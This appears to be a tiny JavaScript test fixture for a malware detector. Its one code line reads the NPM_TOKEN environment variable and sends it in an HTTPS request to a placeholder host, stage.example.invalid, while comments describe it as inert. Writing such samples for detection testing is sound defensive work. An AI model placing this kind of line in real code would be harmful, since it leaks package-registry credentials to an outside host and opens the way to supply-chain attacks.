// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: a login token written into the address of a foreign host.
require('https').get('https://stage.example.invalid/t?n=' + encodeURIComponent(process.env.NPM_TOKEN));
